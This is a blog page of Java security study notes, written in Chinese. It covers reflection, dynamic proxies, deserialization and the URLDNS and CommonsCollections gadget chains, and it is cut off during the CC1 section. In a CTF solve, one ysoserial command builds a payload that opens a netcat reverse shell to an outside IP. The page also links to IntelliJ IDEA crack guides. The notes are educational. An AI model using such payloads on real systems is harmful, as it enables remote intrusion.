<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JAVA安全入门分享 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文章所有参考将在文章结尾给出，我只是根据我的理解与碰到的困难依次给出分享 cc链全名CommonsCollections 取自 1https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial&#x2F;blob&#x2F;master&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;payloads&#x2F;  vscode突然不编java代码了，修理了一下1https:&#x2F;&#x2F;cloud.tencent.com&#x2F;d">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVA安全入门分享">
<meta property="og:url" content="http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/index.html">
<meta property="og:site_name" content="DDL&#39;S BLOG">
<meta property="og:description" content="文章所有参考将在文章结尾给出，我只是根据我的理解与碰到的困难依次给出分享 cc链全名CommonsCollections 取自 1https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial&#x2F;blob&#x2F;master&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;payloads&#x2F;  vscode突然不编java代码了，修理了一下1https:&#x2F;&#x2F;cloud.tencent.com&#x2F;d">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/avatar.png">
<meta property="article:published_time" content="2025-03-17T11:17:14.000Z">
<meta property="article:modified_time" content="2025-03-17T11:19:27.677Z">
<meta property="article:author" content="DDL">
<meta property="article:tag" content="5wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'JAVA安全入门分享',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">JAVA安全入门分享</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">JAVA安全入门分享</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-17T11:17:14.000Z" title="Created 2025-03-17 19:17:14">2025-03-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-17T11:19:27.677Z" title="Updated 2025-03-17 19:19:27">2025-03-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">18.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>96mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>文章所有参考将在文章结尾给出，我只是根据我的理解与碰到的困难依次给出分享</p>
<p>cc链全名CommonsCollections</p>
<p>取自</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/</span><br></pre></td></tr></table></figure>

<h1 id="vscode突然不编java代码了，修理了一下"><a href="#vscode突然不编java代码了，修理了一下" class="headerlink" title="vscode突然不编java代码了，修理了一下"></a>vscode突然不编java代码了，修理了一下</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/2171197</span><br></pre></td></tr></table></figure>

<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>D:\JAVA\java2\bin\java.exe<ul>
<li>21.0.1</li>
</ul>
</li>
<li>D:\JAVA\Java\jdk1.8.0_161\bin\java.exe<ul>
<li>8.0.161</li>
</ul>
</li>
</ul>
<h1 id="idea破解"><a href="#idea破解" class="headerlink" title="idea破解"></a>idea破解</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.quanxiaoha.com/idea/uninstall-idea.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.quanxiaoha.com/idea-pojie/idea-pojie-20243.html</span><br></pre></td></tr></table></figure>

<p>这是我笔记环境设置，除了我没人用的上👇，所以不用看</p>
<ul>
<li>java环境设置<ul>
<li>jar17<ul>
<li><p>JAVA_HOME</p>
<ul>
<li>D:\JAVA\新建文件夹</li>
</ul>
</li>
<li><p>%Java_Home%\jre\bin</p>
</li>
</ul>
</li>
<li>jar 8<ul>
<li>JAVA_HOME<ul>
<li>D:\JAVA\java8</li>
</ul>
</li>
</ul>
</li>
<li>%Java_Home%\jre\bin去掉<ul>
<li>D:\JAVA\java8\bin</li>
</ul>
</li>
<li>jar 8u65</li>
</ul>
</li>
</ul>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where java</span><br><span class="line"></span><br><span class="line">java -XshowSettings:properties -version</span><br></pre></td></tr></table></figure>

<h1 id="全部链子流程图"><a href="#全部链子流程图" class="headerlink" title="全部链子流程图"></a>全部链子流程图</h1><p>图是偷的，看挺好的</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/370134.html">模糊总结</a></p>
<ul>
<li>165前半段是危险函数map调用transform或者4是compare函数</li>
<li>最后的利用exec或者newinstance</li>
</ul>
<img src="https://github.com/DDL08/images/blob/img/img/AllCC.png?raw=true" alt="AllCC"  />

<h1 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h1><ul>
<li><a target="_blank" rel="noopener" href="http://hessian.caucho.com/">http://hessian.caucho.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://central.sonatype.com/?smo=true">maven项目快速导包</a></li>
<li><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.sun.syndication">https://mvnrepository.com/artifact/com.sun.syndication</a></li>
</ul>
<h2 id="maven3-2-1"><a href="#maven3-2-1" class="headerlink" title="maven3.2.1"></a>maven3.2.1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">//F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class</span><br></pre></td></tr></table></figure>

<h2 id="maven4"><a href="#maven4" class="headerlink" title="maven4"></a>maven4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line">//F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class</span><br></pre></td></tr></table></figure>



<h1 id="java安全"><a href="#java安全" class="headerlink" title="java安全"></a>java安全</h1><p>(templateslmpl利用链)[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/129487886]">https://blog.csdn.net/qq_62046696/article/details/129487886]</a></p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><ul>
<li>静态成员变量不能被反序列化</li>
<li>transient标识的对象不参与反序列化</li>
<li>函数<ul>
<li>writeobject</li>
<li>readobject</li>
</ul>
</li>
</ul>
<p>hashmap</p>
<h2 id="反序列化题目"><a href="#反序列化题目" class="headerlink" title="反序列化题目"></a>反序列化题目</h2><ol>
<li>ctfshow卷王杯tomcat</li>
<li></li>
</ol>
<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>概念：运行时动态创建对象</p>
<p>作用：让java具有动态性</p>
<h3 id="1实例化对象"><a href="#1实例化对象" class="headerlink" title="1实例化对象"></a>1实例化对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class c =person.getClass();</span><br><span class="line"></span><br><span class="line">//从原型里实例化对象</span><br><span class="line">#c.newInstance() #无参</span><br><span class="line">#有参👇</span><br><span class="line">Constructor personconstructor=c.getConstructor(String.class.init.class);</span><br><span class="line">Person p=(Person)personconstrructor.newInstance(&quot;abc&quot;,22);</span><br><span class="line">#赋值👆</span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure>

<h3 id="2获取类里面的属性"><a href="#2获取类里面的属性" class="headerlink" title="2获取类里面的属性"></a>2获取类里面的属性</h3><ul>
<li>getFields<ul>
<li>获取共有的属性</li>
</ul>
</li>
<li>getDeclaredFields<ul>
<li>获取全部属性</li>
</ul>
</li>
<li>如果需要查看写个<ul>
<li>Field[] personfields&#x3D;c.getDeclaredFields();</li>
<li>for(Field f:personfields){System.out.println(f);}</li>
</ul>
</li>
</ul>
<h3 id="3修改类里面的属性"><a href="#3修改类里面的属性" class="headerlink" title="3修改类里面的属性"></a>3修改类里面的属性</h3><p>改个名字</p>
<ul>
<li>Field namefield &#x3D;c.getField(“name”)</li>
<li>namefoeld.set(p,”saffs”);</li>
<li>System.out.println(p);</li>
</ul>
<p>转年龄</p>
<ul>
<li>Field namefield &#x3D; c.getField(“age”)</li>
<li>namefield.setAccessible(true);<ul>
<li>让允许访问这个age这个私有属性</li>
</ul>
</li>
<li>namefoeld.set(p,25);</li>
<li>System.out.println(p);</li>
</ul>
<h3 id="4调用类里面的方法"><a href="#4调用类里面的方法" class="headerlink" title="4调用类里面的方法"></a>4调用类里面的方法</h3><ul>
<li>Method actionmethod &#x3D;c.getMethod(“action”,String.class);</li>
<li>actionmethod.invoke(p,”adaad”)</li>
</ul>
<p>遍历方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method[] personmethods=c.getMethods();</span><br><span class="line">for(Method m:personmethods)&#123;</span><br><span class="line">System.out.println(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5hashmap带url"><a href="#5hashmap带url" class="headerlink" title="5hashmap带url"></a>5hashmap带url</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hahscodefield.set(url,1234);HashMap&lt;URL Integer&gt; hashmap =new HashMap&lt;~&gt;();</span><br><span class="line">//如果url对象的hashcode不是-1将会发起请求</span><br><span class="line">Url ul=new URL(&quot;http://xxxx&quot;);</span><br><span class="line">Class c=url.getClass();</span><br><span class="line">Field hashcodefield=c.getDeclareField(&quot;hashCode&quot;);</span><br><span class="line">hashcodefield.setAcessible(True);</span><br><span class="line">hahscodefield.set(url,1234);</span><br><span class="line">hashmap.put(url,1);</span><br><span class="line">//hahscode改为-1</span><br><span class="line">//通过反射,改变已有的对象的属性</span><br><span class="line">hahscodefield.set(url,-1);</span><br></pre></td></tr></table></figure>

<p>序列化没请求，反序列化有请求↑</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="1通过其他对象访问源对象"><a href="#1通过其他对象访问源对象" class="headerlink" title="1通过其他对象访问源对象"></a>1通过其他对象访问源对象</h3><h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>接口变，静态代理也得跟着变，重复工作</p>
<ul>
<li><p>IUser user&#x3D;new UserImpl();</p>
</li>
<li><p>IUser userProxy &#x3D;new UserProxy(user);</p>
</li>
<li><p>userProxy.sjow();</p>
</li>
</ul>
<h4 id="动态代理-1"><a href="#动态代理-1" class="headerlink" title="动态代理"></a>动态代理</h4><p>newProxyInstance(类加载器+接口+处理器（要做的事情))</p>
<ul>
<li><p>proxy.newProxyInstance(user.getClass.getClassLoader(),user.getClass().getInterfaces(),);</p>
</li>
<li><p>自己写个handler去重写方法invoke</p>
</li>
<li><pre><code>- InvocationHandler userinvocationhandle=new UserInvocationHandler(user);
- IUser userproxy=(IUser) proxy.newProxyInstance(user.getClass(.getClassLoader(),user.getClass().getInterfaces(),));
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 动态加载</span><br><span class="line"></span><br><span class="line">class.forName(&quot;Person&quot;);</span><br><span class="line"></span><br><span class="line">ClassLoader cl =ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">ClassLoader.loadClass不进行初始化</span><br><span class="line"></span><br><span class="line"># 问题</span><br><span class="line"></span><br><span class="line">## java版本的切换</span><br><span class="line"></span><br></pre></td></tr></table></figure>
sudo apt update
sudo apt install openjdk-8-jdk
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">显示当前有的版本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
sudo update-alternatives --config java
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">再输入数字可以切换</span><br><span class="line"></span><br><span class="line">### 参考</span><br><span class="line"></span><br></pre></td></tr></table></figure>
https://blog.csdn.net/huayimy/article/details/130273362
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 做题↓</span><br><span class="line"></span><br><span class="line"># bugku</span><br><span class="line"></span><br><span class="line">## ez_java_serialize</span><br><span class="line"></span><br><span class="line">源码有commons-collections 的3.1的依赖，直接打</span><br><span class="line"></span><br></pre></td></tr></table></figure>
java -jar ysoserial.jar CommonsCollections5 &quot;nc 123.56.226.71 443 -e /bin/bash&quot; |base64 -w0
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># URLDNS链子</span><br><span class="line"></span><br><span class="line">## 关键点</span><br><span class="line"></span><br><span class="line">最开始是这样，但是在序列化的时候就会发起dns请求</span><br><span class="line"></span><br><span class="line">因为：这个put调用hash，调用key的hashcode；也就是url的hashcode，然后那个-1的值就会发生变化，反序列化的时候就不会发起请求</span><br><span class="line"></span><br></pre></td></tr></table></figure>
HashMap&lt;URL,Integer&gt; hashmap=new HashMap&lt;&gt;();
URL url=new URL(&quot;http://gm61kjxu965tjvssmnwn4l0af1lr9g.oastify.com&quot;);
hashmap.put(url,1);
serialize(hashmap);
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">那就修改url的hashcode👇，在put之前改成不是-1的数，put之后再改为-1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
Field hashcodefield=c.getDeclaredField(&quot;hashCode&quot;);
hashcodefield.setAccessible(true);
hashcodefield.set(url,1234);
hashmap.put(url,1);
hashcodefield.set(url,-1);
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 结构</span><br><span class="line"></span><br></pre></td></tr></table></figure>
Gadget Chain:
  HashMap.readObject()
      HashMap.putVal()
          HashMap.hash()
              URL.hashCode()
</code></pre>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>    public static void main(String[] args) throws Exception&#123;
        HashMap&lt;URL,Integer&gt; hashmap= new HashMap&lt;URL,Integer&gt;();
        // 这里不要发起请求
        URL url = new URL(&quot;http://lpe9n3shyhwxdmfp7683i8cxbohe53.oastify.com&quot;);
        Class c = url.getClass();
        Field hashcodefile = c.getDeclaredField(&quot;hashCode&quot;);
        hashcodefile.setAccessible(true);
        hashcodefile.set(url,1234);
        hashmap.put(url,1);

        // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性
        hashcodefile.set(url,-1);
        serialize(hashmap);
        unserialize(&quot;ser.bin&quot;);

    &#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># CC1链子</span><br><span class="line"></span><br><span class="line">## 取材</span><br><span class="line"></span><br><span class="line">- https://blog.lupf.cn/category/jdkdl</span><br><span class="line">  - 8899密码</span><br><span class="line">- https://www.oracle.com/java/technologies/downloads/#jre8-windows</span><br><span class="line">- - 官网8u65,中文版排版有问题</span><br><span class="line">- </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 搭建问题</span><br><span class="line"></span><br><span class="line">### 挂羊头卖狗肉的官网，换成英文版的就好了</span><br><span class="line"></span><br><span class="line">![image-20250122235802317](https://github.com/DDL08/images/blob/img/img/image-20250122235802317.png?raw=true)</span><br><span class="line"></span><br><span class="line">### 我解压出的8u65没有src，</span><br><span class="line"></span><br><span class="line">![image-20250123123237633](https://github.com/DDL08/images/blob/img/img/image-20250123123237633.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250123123350994](https://github.com/DDL08/images/blob/img/img/image-20250123123350994.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250123124313907](https://github.com/DDL08/images/blob/img/img/image-20250123124313907.png?raw=true)</span><br><span class="line"></span><br><span 